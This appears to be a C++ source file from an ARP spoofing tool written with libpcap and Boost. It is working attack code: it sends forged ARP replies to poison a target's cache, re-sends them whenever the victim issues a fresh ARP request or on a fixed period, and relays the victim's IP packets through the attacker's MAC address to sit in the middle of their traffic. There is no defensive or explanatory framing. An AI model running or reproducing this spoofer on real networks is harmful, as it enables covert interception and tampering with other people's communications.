#include <pcap.h>
#include <iostream>
#include <boost/thread.hpp>

#include "../../includes/arpspoof/ArpSpoof.h"
#include "../../includes/network/packet/ArpPacket.h"
#include "../../includes/network/packet/IpPacket.h"

using namespace network;
using namespace std;

namespace arpspoof {

    void ArpSpoof::spoof() {
        pcap *desc = open_dev(device.c_str());

        int cnt = 3;
        while (cnt--) {
            send_arp(desc);
            boost::this_thread::sleep_for(boost::chrono::seconds(1));
        }

        auto *filter = new bpf_program;
        if (pcap_compile(desc, filter, "arp", 1, 0) == -1 and pcap_setfilter(desc, filter) == -1) {
            std::cerr << "error: " << pcap_geterr(desc) << std::endl;
            exit(-1);
        }
        delete filter;

        const byte *packet = new byte[8192];
        pcap_pkthdr *header;
        int res = 0;
        while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
            if (res == 0) continue;
            ArpPacket pk(packet);

            if (pk.arp.opcode == ARPOP_REQUEST and
                pk.arp.sender_ip == session.sender.second and pk.arp.target_ip == session.target.second) {
                cnt = 3;
                while (cnt--) {
                    send_arp(desc);
                    boost::this_thread::sleep_for(boost::chrono::seconds(1));
                }
            }
        }
    }

    void ArpSpoof::spoof_periodic(uint32_t period) {
        pcap *desc = open_dev(device.c_str());
        while (true) {
            try {
                send_arp(desc);
                boost::this_thread::sleep_for(boost::chrono::seconds(period));
            } catch (const runtime_error &ex) {
                cerr << ex.what() << endl;
                break;
            }
        }
        pcap_close(desc);
    }

    void ArpSpoof::send_arp(pcap *desc, uint16_t op) {
        ArpPacket pk(op, dev_mac, session.target.second, session.sender.first, session.sender.second);

        cout << "sent packet: " << session.sender.second << endl;
        if (pcap_sendpacket(desc, pk.to_bytes().data(), pk.size()) != 0) {
            throw runtime_error("Error sending the packet : " + string(pcap_geterr(desc)));
        }
    }

    void ArpSpoof::spoofed_relay() {
        pcap *desc = open_dev(device.c_str());

        const byte *packet = new byte[8192];
        pcap_pkthdr *header;
        int res = 0;
        while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
            if (res == 0) continue;
            IpPacket pk(packet);

            if (pk.eth.type == ETHERTYPE_IP and
                pk.eth.src == session.sender.first) {
                pk.eth.src = dev_mac;
                pk.eth.dst = session.target.first;

                cout << pk.ip.src << " -> " << pk.ip.dst << endl;
                if (pcap_sendpacket(desc, pk.to_bytes().data(), pk.size()) != 0) {
                    cout << "Error sending the packet : " + string(pcap_geterr(desc)) << endl;
                }
            }
        }
        pcap_close(desc);
    }

}